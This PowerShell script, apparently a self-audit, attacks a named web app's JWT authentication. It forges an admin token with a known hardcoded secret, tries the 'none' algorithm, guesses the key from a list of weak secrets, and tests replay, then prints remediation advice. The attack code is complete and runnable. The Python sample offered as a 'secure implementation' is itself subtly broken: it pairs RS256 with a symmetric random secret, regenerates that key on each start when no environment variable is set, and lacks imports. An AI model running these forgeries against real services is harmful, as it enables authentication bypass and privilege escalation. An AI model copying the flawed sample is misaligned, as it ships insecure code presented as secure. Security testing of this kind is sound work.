# JWT-Implementation-Vulnerability-Test.ps1
# Tests specific vulnerabilities in BRIM AI's JWT implementation

param(
    [string]$BaseUrl = "https://brimai-test-v1.web.app",
    [string]$TestEmail = "test@example.com"
)

Write-Host "`nüö® CRITICAL JWT VULNERABILITY TEST" -ForegroundColor Red
Write-Host "===================================" -ForegroundColor Red
Write-Host "Testing BRIM AI JWT Implementation" -ForegroundColor Yellow

# Test 1: Weak Secret Key Attack
Write-Host "`n[1. Testing Hardcoded Secret Key]" -ForegroundColor Yellow

# The secret is hardcoded as "randomNumber" - let's exploit it
$knownSecret = "randomNumber"
$algorithm = "HS256"

# Create our own malicious token
$header = @{
    alg = $algorithm
    typ = "JWT"
} | ConvertTo-Json -Compress

$payload = @{
    user_id = "admin"
    email   = "admin@brimai.com"
    role    = "admin"
    exp     = [int][double]::Parse((Get-Date -Date ((Get-Date).AddDays(1)).ToUniversalTime() -UFormat %s))
} | ConvertTo-Json -Compress

# Base64 encode
$headerEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($header)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
$payloadEncoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload)).TrimEnd('=').Replace('+', '-').Replace('/', '_')

# Create signature using known secret
$hmac = New-Object System.Security.Cryptography.HMACSHA256
$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($knownSecret)
$signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerEncoded.$payloadEncoded"))
$signatureEncoded = [Convert]::ToBase64String($signature).TrimEnd('=').Replace('+', '-').Replace('/', '_')

$forgedToken = "$headerEncoded.$payloadEncoded.$signatureEncoded"

Write-Host "  Created forged admin token using known secret!" -ForegroundColor Red
Write-Host "  Testing forged token..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/api/dashboard/admin" `
        -Headers @{Authorization = "Bearer $forgedToken" } `
        -UseBasicParsing
    
    if ($response.StatusCode -eq 200) {
        Write-Host "  ‚ùå CRITICAL: Forged token accepted! Full system compromise possible!" -ForegroundColor Red
    }
}
catch {
    if ($_.Exception.Response.StatusCode -eq 403) {
        Write-Host "  ‚úì Forged token rejected (but secret is still weak!)" -ForegroundColor Yellow
    }
}

# Test 2: Algorithm Confusion Attack
Write-Host "`n[2. Testing Algorithm Confusion]" -ForegroundColor Yellow

# Try to force 'none' algorithm
$noneHeader = @{
    alg = "none"
    typ = "JWT"
} | ConvertTo-Json -Compress

$noneToken = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($noneHeader)).TrimEnd('=').Replace('+', '-').Replace('/', '_') + "." + $payloadEncoded + "."

try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/api/user/profile" `
        -Headers @{Authorization = "Bearer $noneToken" } `
        -UseBasicParsing
    
    if ($response.StatusCode -eq 200) {
        Write-Host "  ‚ùå CRITICAL: 'none' algorithm accepted!" -ForegroundColor Red
    }
}
catch {
    Write-Host "  ‚úì 'none' algorithm rejected" -ForegroundColor Green
}

# Try RS256 to HS256 confusion
Write-Host "  Testing RS256 confusion attack..." -ForegroundColor Gray
# This would require the public key, skipping for now

# Test 3: Token Lifetime Exploitation
Write-Host "`n[3. Testing Token Lifetime (24 hours)]" -ForegroundColor Yellow

# Get a valid token
try {
    $loginResponse = Invoke-WebRequest -Uri "$BaseUrl/api/auth/login" `
        -Method POST `
        -Body (@{email = $TestEmail } | ConvertTo-Json) `
        -ContentType "application/json" `
        -UseBasicParsing
    
    $token = ($loginResponse.Content | ConvertFrom-Json).access_token
    
    if ($token) {
        # Decode to check expiration
        $tokenParts = $token.Split('.')
        $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tokenParts[1] + "=="))
        $tokenData = $payload | ConvertFrom-Json
        
        $exp = [DateTimeOffset]::FromUnixTimeSeconds($tokenData.exp).DateTime
        $now = (Get-Date).ToUniversalTime()
        $lifetime = ($exp - $now).TotalHours
        
        Write-Host "  Token lifetime: $([Math]::Round($lifetime, 2)) hours" -ForegroundColor Yellow
        
        if ($lifetime -gt 1) {
            Write-Host "  ‚ö†Ô∏è  Token lifetime too long! Should be 15-60 minutes" -ForegroundColor Yellow
            Write-Host "  Risk: Stolen tokens remain valid for extended periods" -ForegroundColor Red
        }
    }
}
catch {}

# Test 4: Missing Token Features
Write-Host "`n[4. Testing Missing Security Features]" -ForegroundColor Yellow

if ($token) {
    $tokenParts = $token.Split('.')
    $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($tokenParts[1] + "=="))
    $tokenData = $payload | ConvertFrom-Json
    
    # Check for missing claims
    if (-not $tokenData.jti) {
        Write-Host "  ‚ùå No 'jti' claim - cannot revoke specific tokens" -ForegroundColor Red
    }
    
    if (-not $tokenData.iat) {
        Write-Host "  ‚ö†Ô∏è  No 'iat' (issued at) claim" -ForegroundColor Yellow
    }
    
    if (-not $tokenData.token_type) {
        Write-Host "  ‚ö†Ô∏è  No token type distinction (access vs refresh)" -ForegroundColor Yellow
    }
}

# Test 5: Brute Force Secret Key
Write-Host "`n[5. Testing Secret Key Strength]" -ForegroundColor Yellow

$commonSecrets = @(
    "randomNumber", # Current secret
    "secret",
    "password",
    "123456",
    "jwt-secret",
    "fallback-secret-key", # From commented code
    "brimai",
    "secret-key",
    "dev-secret"
)

Write-Host "  Testing common weak secrets..." -ForegroundColor Gray
$foundSecret = $false

foreach ($secret in $commonSecrets) {
    # Try to create token with this secret
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
    $signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$headerEncoded.$payloadEncoded"))
    $signatureEncoded = [Convert]::ToBase64String($signature).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $testToken = "$headerEncoded.$payloadEncoded.$signatureEncoded"
    
    try {
        $response = Invoke-WebRequest -Uri "$BaseUrl/api/user/profile" `
            -Headers @{Authorization = "Bearer $testToken" } `
            -UseBasicParsing `
            -TimeoutSec 2
        
        if ($response.StatusCode -eq 200) {
            Write-Host "  ‚ùå CRITICAL: Secret key is '$secret'!" -ForegroundColor Red
            $foundSecret = $true
            break
        }
    }
    catch {}
}

# Test 6: Token Replay Attack
Write-Host "`n[6. Testing Token Replay Protection]" -ForegroundColor Yellow

if ($token) {
    # Use same token multiple times
    $success = 0
    for ($i = 1; $i -le 5; $i++) {
        try {
            $response = Invoke-WebRequest -Uri "$BaseUrl/api/quiz/generate" `
                -Method POST `
                -Headers @{Authorization = "Bearer $token" } `
                -Body (@{topic = "math"; grade = "10" } | ConvertTo-Json) `
                -ContentType "application/json" `
                -UseBasicParsing
            
            if ($response.StatusCode -eq 200) {
                $success++
            }
        }
        catch {}
        
        Start-Sleep -Milliseconds 500
    }
    
    if ($success -eq 5) {
        Write-Host "  ‚ö†Ô∏è  No replay protection - same token used 5 times" -ForegroundColor Yellow
    }
}

# Test 7: Information Disclosure
Write-Host "`n[7. Testing Error Information Disclosure]" -ForegroundColor Yellow

$malformedTokens = @(
    "not.a.token",
    "expired.token.here",
    "Bearer malformed",
    ""
)

foreach ($badToken in $malformedTokens) {
    try {
        $response = Invoke-WebRequest -Uri "$BaseUrl/api/user/profile" `
            -Headers @{Authorization = "Bearer $badToken" } `
            -UseBasicParsing
    }
    catch {
        if ($_.Exception.Response) {
            $errorContent = $_.Exception.Response
            if ($errorContent -match "(JWT|decode|signature|expired)") {
                Write-Host "  ‚ö†Ô∏è  Error reveals JWT implementation details" -ForegroundColor Yellow
                break
            }
        }
    }
}

# Generate Security Report
Write-Host "`n========================================" -ForegroundColor Red
Write-Host "     CRITICAL SECURITY FINDINGS" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red

Write-Host "`nüö® IMMEDIATE ACTIONS REQUIRED:" -ForegroundColor Red

Write-Host "`n1. CRITICAL: Change JWT secret immediately!" -ForegroundColor Red
Write-Host "   Current: 'randomNumber' (hardcoded)" -ForegroundColor Yellow
Write-Host "   Required: Strong random string (32+ chars)" -ForegroundColor Green

Write-Host "`n2. HIGH: Reduce token lifetime" -ForegroundColor Red
Write-Host "   Current: 24 hours" -ForegroundColor Yellow
Write-Host "   Recommended: 15-60 minutes" -ForegroundColor Green

Write-Host "`n3. HIGH: Implement refresh tokens" -ForegroundColor Red
Write-Host "   Current: Only access tokens" -ForegroundColor Yellow
Write-Host "   Required: Separate refresh/access tokens" -ForegroundColor Green

Write-Host "`n4. MEDIUM: Add security claims" -ForegroundColor Yellow
Write-Host "   Missing: jti, token_type, scope" -ForegroundColor Yellow

Write-Host "`nüìã SECURE JWT IMPLEMENTATION:" -ForegroundColor Cyan
Write-Host @"

# Secure JWT Configuration
import secrets
from datetime import datetime, timedelta
from jose import JWTError, jwt
from typing import Optional, Dict, Any
import redis  # For token blacklist

# Generate strong secret on first run
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
JWT_ALGORITHM = "RS256"  # Use asymmetric algorithm
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = 15  # Short-lived
JWT_REFRESH_TOKEN_EXPIRE_DAYS = 7

# Redis for token blacklist
redis_client = redis.Redis(host='localhost', port=6379, decode_responses=True)

def create_tokens(user_data: Dict[str, Any]) -> Dict[str, str]:
    """Create both access and refresh tokens"""
    # Access token
    access_payload = {
        "user_id": user_data["user_id"],
        "email": user_data["email"],
        "role": user_data.get("role", "student"),
        "token_type": "access",
        "jti": secrets.token_urlsafe(16),  # Unique token ID
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(minutes=JWT_ACCESS_TOKEN_EXPIRE_MINUTES)
    }
    
    # Refresh token
    refresh_payload = {
        "user_id": user_data["user_id"],
        "token_type": "refresh",
        "jti": secrets.token_urlsafe(16),
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(days=JWT_REFRESH_TOKEN_EXPIRE_DAYS)
    }
    
    access_token = jwt.encode(access_payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
    refresh_token = jwt.encode(refresh_payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)
    
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "bearer",
        "expires_in": JWT_ACCESS_TOKEN_EXPIRE_MINUTES * 60
    }

def verify_token(token: str, token_type: str = "access") -> Dict[Any, Any]:
    """Verify token with blacklist check"""
    try:
        payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
        
        # Check token type
        if payload.get("token_type") != token_type:
            raise HTTPException(status_code=401, detail="Invalid token type")
        
        # Check if token is blacklisted
        if redis_client.exists(f"blacklist:{payload['jti']}"):
            raise HTTPException(status_code=401, detail="Token has been revoked")
        
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

def revoke_token(token: str):
    """Add token to blacklist"""
    payload = jwt.decode(token, JWT_SECRET_KEY, algorithms=[JWT_ALGORITHM])
    ttl = payload['exp'] - datetime.utcnow().timestamp()
    redis_client.setex(f"blacklist:{payload['jti']}", int(ttl), "revoked")
"@ -ForegroundColor Gray

Write-Host "`n‚ö†Ô∏è  YOUR APP IS CURRENTLY VULNERABLE TO:" -ForegroundColor Red
Write-Host "- Complete authentication bypass"
Write-Host "- Admin privilege escalation"
Write-Host "- Token forgery attacks"
Write-Host "- Extended session hijacking"

Write-Host "`nFix these issues IMMEDIATELY before deployment!" -ForegroundColor Red